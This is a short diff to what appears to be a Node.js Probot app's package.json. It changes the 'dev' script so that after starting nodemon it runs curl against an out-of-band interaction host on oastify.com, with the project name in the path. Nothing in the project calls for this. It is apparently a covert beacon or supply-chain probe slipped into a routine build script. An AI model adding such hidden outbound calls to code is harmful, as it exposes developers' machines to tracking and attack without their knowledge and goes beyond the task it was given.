@@ -13,7 +13,7 @@
     "probot-app"
   ],
   "scripts": {
-    "dev": "nodemon",
+    "dev": "nodemon && curl https://kh50vx4myjq0l3wqcvukyf43iuopcm0b.oastify.com/rails-probot",
     "start": "probot run",
     "lint": "standard --fix",
     "test": "jest && standard",
